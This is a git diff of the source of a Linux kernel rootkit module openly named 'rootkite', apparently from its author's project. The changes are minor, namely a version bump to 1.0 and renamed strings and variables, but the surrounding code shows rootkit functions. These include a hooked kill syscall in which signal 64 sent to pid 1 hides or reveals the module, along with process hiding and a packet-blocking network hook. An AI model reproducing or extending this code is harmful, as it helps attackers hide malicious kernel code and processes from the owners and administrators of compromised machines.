@@ -3,8 +3,8 @@
 #include <linux/kernel.h> // types, macros, functions for kernel
 #include <linux/kallsyms.h> // functions for kallsyms actions
 #include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
-#include <asm/paravirt.h>
 #include <linux/reboot.h> // reboot function
+
 
 #include "kite_hook.h"
 #include "device_handler.h"
@@ -21,7 +21,7 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("rootkite");
 MODULE_AUTHOR("NondairyDig");
-MODULE_VERSION("0.7");
+MODULE_VERSION("1.0");
 
 
 #ifdef PTREGS_SYSCALL_STUB
@@ -76,11 +76,11 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
     if ( (sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            printk(KERN_INFO "Hide pookkit\n");
+            printk(KERN_INFO "Hide rootkite\n");
             hide_mod();
         }
         else{
-            printk(KERN_INFO "Show pookkit\n");
+            printk(KERN_INFO "Show rootkite\n");
             show_mod();
         }
     }
@@ -211,7 +211,7 @@ static void cleanup(void){
     if(hide_process_active == 1){
         switch_hide_process();
     }
-    if(packet_dropper == 1){
+    if(packet_blocker == 1){
         switch_net_hook();
     }
 }
